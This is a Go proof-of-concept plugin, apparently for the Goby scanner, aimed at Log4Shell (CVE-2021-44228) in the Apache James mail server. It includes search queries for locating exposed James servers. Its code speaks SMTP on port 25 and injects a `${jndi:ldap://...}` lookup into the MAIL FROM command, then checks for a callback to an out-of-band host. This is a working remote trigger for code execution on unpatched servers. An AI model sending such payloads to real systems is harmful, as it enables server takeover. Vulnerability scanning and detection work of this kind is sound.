package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Apache James Log4j2 command execution vulnerability(CVE-2021-44228)",
    "Description": "<p>Apache James is the next free open source free mail server of Apache foundation that provides POP3 and STMP for free.</p><p>Apache James uses log4j2 to have a command execution vulnerability. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Impact": "Apache James Log4j2 command execution vulnerability(CVE-2021-44228)",
    "Recommendation": "<p>The official website has not fixed the vulnerability, please contact the vendor to fix the vulnerability: <a href=\"https://james.apache.org/\">https://james.apache.org/</a></p><p>Temporary solution:</p><p>1, upgrade log4j2 to the latest version:</p><p> Download address: <a href=\"https://github.com/apache/logging-log4j2\">https://github.com/apache/ logging-log4j2</a></p><p>2. Emergency mitigation measures:</p><p>(1) Modify the jvm parameter -Dlog4j2.formatMsgNoLookups=true</p><p>(2) Modify Configure log4j2.formatMsgNoLookups=True</p><p>(3) Set the system environment variable FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS to true</p>",
    "Product": "Apache James",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Apache James Log4j2 命令执行漏洞（CVE-2021-44228）",
            "Description": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\"><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Apache James</span>是apache基金会下一款免费的提供pop3、stmp的开源免费邮件服务器。<br></span></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\"></span>Apache James<span style=\"color: rgb(22, 51, 102); font-size: 16px;\"> 使用 log4j2 存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</span><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Apache James</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">&nbsp;使用 log4j2 存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</span><br></p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：</p><p>临时解决方案：</p><p><span style=\"color: var(--primaryFont-color);\">1、升级log4j2至最新版本：</span><br></p><p>&nbsp;下载地址：<a href=\"https://github.com/apache/logging-log4j2\">https://github.com/apache/logging-log4j2</a></p><p>2、紧急缓解措施：</p><p>（1） 修改 jvm 参数 -Dlog4j2.formatMsgNoLookups=true</p><p>（2） 修改配置 log4j2.formatMsgNoLookups=True</p><p>（3） 将系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置 为 true</p>",
            "Product": "Apache James",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Apache James Log4j2 command execution vulnerability(CVE-2021-44228)",
            "Description": "<p>Apache James is the next free open source free mail server of Apache foundation that provides POP3 and STMP for free.</p><p>Apache James uses log4j2 to have a command execution vulnerability. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Impact": "Apache James Log4j2 command execution vulnerability(CVE-2021-44228)",
            "Recommendation": "<p>The official website has not fixed the vulnerability, please contact the vendor to fix the vulnerability: <a href=\"https://james.apache.org/\">https://james.apache.org/< /a></p><p>Temporary solution:</p><p><span style=\"color: var(--primaryFont-color);\">1, upgrade log4j2 to the latest version:< /span><br></p><p>&nbsp;Download address: <a href=\"https://github.com/apache/logging-log4j2\">https://github.com/apache/ logging-log4j2</a></p><p>2. Emergency mitigation measures:</p><p>(1) Modify the jvm parameter -Dlog4j2.formatMsgNoLookups=true</p><p>(2) Modify Configure log4j2.formatMsgNoLookups=True</p><p>(3) Set the system environment variable FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS to true</p>",
            "Product": "Apache James",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "(banner=\"JAMES SMTP Server\" || banner=\"JAMES POP3 Server\" || banner=\"Apache JAMES awesome SMTP Server\" || banner=\"Email Server (Apache JAMES)\") || (banner=\"JAMES\" && protocol=\"smtp\")",
    "GobyQuery": "(banner=\"JAMES SMTP Server\" || banner=\"JAMES POP3 Server\" || banner=\"Apache JAMES awesome SMTP Server\" || banner=\"Email Server (Apache JAMES)\") || (banner=\"JAMES\" && protocol=\"smtp\")",
    "Author": "Chin",
    "Homepage": "https://james.apache.org/",
    "DisclosureDate": "2021-12-22",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": false,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [
        "CVE-2021-44228"
    ],
    "CNVD": [
        "CNVD-2021-95914"
    ],
    "CNNVD": [
        "CNNVD-202112-799"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10246"
}`

	sendPayload := func(conn net.Conn, payloadHex string) string {
		payload, err := hex.DecodeString(payloadHex)
		if err != nil {
			return ""
		}
		_, err = conn.Write(payload)
		if err != nil {
			return ""
		}
		resp := make([]byte, 4096)
		_, err = conn.Read(resp)
		if err != nil {
			return ""
		}
		return string(resp)
	}
	genPayload := func(payload string) string {
		payload = hex.EncodeToString([]byte(payload))
		_, err := hex.DecodeString("4d41494c2046524f4d3a3c27" + payload + "40676d61696c2e636f6d273e0d0a")
		if err != nil {
			fmt.Println(err)
		}
		return "4d41494c2046524f4d3a3c27" + payload + "2f617d40676d61696c2e636f6d273e0d0a"
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			ip := u.IP
			port := ":25"
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			payload := fmt.Sprintf("${jndi:ldap://%s}", checkUrl)
			conn, err := httpclient.GetTCPConn(ip + port)
			if err != nil {
				return false
			}
			defer conn.Close()
			resp := sendPayload(conn, "")
			if strings.Contains(resp, "ready") {
				dataHello := "45484c4f206d61696c2e7478740d0a"
				respHELO := sendPayload(conn, dataHello)
				if strings.Contains(respHELO, "PIPELINING") && strings.Contains(respHELO, "ENHANCEDSTATUSCODES") && strings.Contains(respHELO, "8BITMIME") {
					dataPayload := genPayload(payload)
					sendPayload(conn, dataPayload)
				}
			}
			sendPayload(conn, "515549540d0a")
			return godclient.PullExists(checkStr, time.Second*10)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			return expResult
		},
	))
}
